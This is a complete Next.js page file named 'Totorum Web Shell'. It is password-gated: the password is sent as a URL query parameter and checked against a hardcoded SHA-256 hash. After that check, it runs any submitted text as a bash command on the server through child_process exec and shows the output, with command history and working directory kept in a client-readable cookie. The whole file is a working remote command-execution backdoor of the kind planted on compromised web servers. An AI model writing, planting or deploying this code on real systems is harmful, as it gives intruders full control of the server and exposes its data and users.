import { cookies } from "next/headers";
import Script from "next/script";
import crypto from "node:crypto";
import { exec as _exec } from "node:child_process";

const SECRET =
  "f86da12e84838d80ad04c248216b23bb928ef53164737f37b5beebba8e28b211"; // ChangeIT!

function sha256Hex(input: string): string {
  return crypto.createHash("sha256").update(String(input)).digest("hex");
}

function timingSafeEqual(a: string, b: string): boolean {
  try {
    const ab = Buffer.from(String(a));
    const bb = Buffer.from(String(b));
    if (ab.length !== bb.length) return false;
    return crypto.timingSafeEqual(ab, bb);
  } catch {
    return false;
  }
}

async function exec(
  cmd: string,
  opts: { shell?: string; timeout?: number; maxBuffer?: number } = {},
) {
  return new Promise<{ stdout: string; stderr: string }>((resolve, reject) => {
    _exec(
      cmd,
      {
        shell: "/bin/bash",
        timeout: 60_000,
        maxBuffer: 10 * 1024 * 1024,
        ...opts,
      },
      (error, stdout, stderr) => {
        if (error)
          return reject({
            error,
            stdout: String(stdout || ""),
            stderr: String(stderr || ""),
          });
        resolve({ stdout: String(stdout || ""), stderr: String(stderr || "") });
      },
    );
  });
}

function b64encode(b64: string) {
  return Buffer.from(b64, "utf8").toString("base64");
}

function b64decode(b64: string): string {
  return Buffer.from(b64, "base64").toString("utf8");
}

function shQuote(s: string): string {
  return "'" + String(s).replace(/'/g, "'\"'\"'") + "'";
}

export async function runCommand(formData: FormData) {
  "use server";
  const pw = String(formData.get("pw") || "");
  const pwHash = sha256Hex(pw);
  const cmd = String(formData.get("cmd") || "").trim();
  const cwdIn = String(formData.get("cwd") || "");
  let cwd = cwdIn || process.cwd();

  if (!cmd || !timingSafeEqual(pwHash, SECRET)) {
    return;
  }

  const cookieStore = await cookies();
  const prevStateCookie = cookieStore.get("admin_state")?.value;
  let history: string[] = [];
  if (prevStateCookie) {
    try {
      const prevState = JSON.parse(b64decode(prevStateCookie));
      if (Array.isArray(prevState?.history)) {
        history = prevState.history.map((row: unknown) => String(row));
      }
    } catch {
      history = [];
    }
  }

  const marker = `__PWD_MARKER_${crypto.randomUUID()}__`;
  const fullCmd = `cd ${shQuote(cwd)}; ${cmd}; printf "\\n${marker}%s\\n" "$PWD"`;

  let stdout = "";
  let stderr = "";
  try {
    ({ stdout, stderr } = await exec(fullCmd));
  } catch (e: any) {
    stdout = String(e?.stdout || "");
    stderr = String(e?.stderr || "");
  }

  const markerIndex = stdout.lastIndexOf(marker);
  if (markerIndex >= 0) {
    const nextCwd = stdout
      .slice(markerIndex + marker.length)
      .split("\n")[0]
      ?.trim();
    if (nextCwd) cwd = nextCwd;
    stdout = stdout.slice(0, markerIndex).replace(/\n$/, "");
  }

  const output = [stdout, stderr].filter((row) => row.trim() !== "").join("\n");
  history = [...history, "$ " + cmd, output || "(no output)"].slice(-100);

  cookieStore.set("admin_state", b64encode(JSON.stringify({ history, cwd })), {
    httpOnly: false,
    sameSite: "lax",
  });
}

type SearchParams = Record<string, string | string[] | undefined>;

export default async function AdminShellPage({
  searchParams,
}: {
  searchParams?: SearchParams | Promise<SearchParams>;
}) {
  const resolvedSearchParams = await Promise.resolve(searchParams ?? {});
  const pwValue = resolvedSearchParams.pw;
  const pw = Array.isArray(pwValue)
    ? String(pwValue[0] || "")
    : String(pwValue || "");
  const pwHash = sha256Hex(pw);

  const cookieStore = await cookies();
  const stateCookie = cookieStore.get("admin_state")?.value;
  let state = { history: [], cwd: "." };
  if (stateCookie) {
    state = JSON.parse(b64decode(stateCookie));
  }

  if (!pw || !timingSafeEqual(pwHash, SECRET)) {
    return (
      <div
        style={{
          padding: 20,
          fontFamily: "ui-sans-serif, system-ui, -apple-system, sans-serif",
          color: "#ff8b8b",
          background: "#0b0f14",
          minHeight: "100vh",
        }}
      >
        Forbidden. Supply correct password with <code>?pw=YOUR_PASSWORD</code>.
      </div>
    );
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        color: "#e6edf7",
        background: "#070b11",
        fontFamily:
          "ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace",
      }}
    >
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          padding: "28px 16px 32px",
        }}
      >
        <div
          style={{
            width: "100%",
            maxWidth: "1280px",
            background: "rgba(12, 18, 27, 0.78)",
            border: "1px solid #233041",
            borderRadius: 16,
            padding: 20,
            boxShadow: "0 18px 36px rgba(0, 0, 0, 0.42)",
            backdropFilter: "blur(3px)",
          }}
        >
          <h1
            style={{
              textAlign: "center",
              fontSize: "23px",
              margin: "0 0 15px",
              color: "#7fd0ff",
              letterSpacing: "0.03em",
              textShadow: "0 0 20px rgba(80, 183, 255, 0.25)",
            }}
          >
            Totorum Web Shell
          </h1>
          <div
            id="output"
            style={{
              marginTop: 10,
              marginBottom: 10,
              padding: 15,
              borderRadius: 10,
              width: "100%",
              height: 500,
              overflowX: "auto",
              overflowY: "auto",
              background: "#0a121c",
              borderColor: "#2c3e53",
              border: "1px solid",
              color: "#c4d3e6",
              boxShadow: "inset 0 0 0 1px rgba(109, 189, 255, 0.08)",
            }}
          >
            {state.history.map((row: string, index: number) => (
              <pre
                key={`cmd-${index}`}
                className="out"
                style={{
                  margin: "4px",
                  padding: "2px 6px",
                  fontWeight: row.startsWith("$ ") ? 700 : 400,
                  color: row.startsWith("$ ") ? "#7ee787" : "#d6e2f0",
                }}
              >
                {row}
              </pre>
            ))}
          </div>
          <Script id="output-auto-scroll" strategy="afterInteractive">
            {`
              (() => {
                const output = document.getElementById("output");
                if (!output) return;
                const scrollToBottom = () => {
                  output.scrollTop = output.scrollHeight;
                };
                scrollToBottom();
                const observer = new MutationObserver(scrollToBottom);
                observer.observe(output, {
                  childList: true,
                  subtree: true,
                  characterData: true,
                });
              })();
            `}
          </Script>

          <form
            action={runCommand}
            className="controls"
            style={{
              display: "flex",
              flexDirection: "column",
              marginTop: 18,
              gap: 8,
            }}
          >
            <input type="hidden" name="pw" value={pw} />
            <input type="hidden" name="cwd" value={state.cwd || "."} />
            {state.cwd !== "." && (
              <div
                style={{
                  display: "inline-flex",
                  width: "fit-content",
                  padding: "4px 10px",
                  borderRadius: 999,
                  border: "1px solid #2c3e53",
                  background: "#111a25",
                  color: "#86b6df",
                  fontSize: 13,
                }}
              >
                CWD: {state.cwd}
              </div>
            )}
            <input
              name="cmd"
              type="text"
              placeholder="Type command here and press Enter"
              autoFocus
              style={{
                background: "#0c141f",
                padding: 15,
                borderRadius: 10,
                display: "flex",
                flexGrow: 1,
                color: "#eaf2ff",
                borderColor: "#2c3e53",
                border: "1px solid",
                marginTop: "10px",
                outline: "none",
                boxShadow: "0 0 0 1px rgba(68, 162, 240, 0.18)",
              }}
            />
          </form>
        </div>
      </div>
    </div>
  );
}
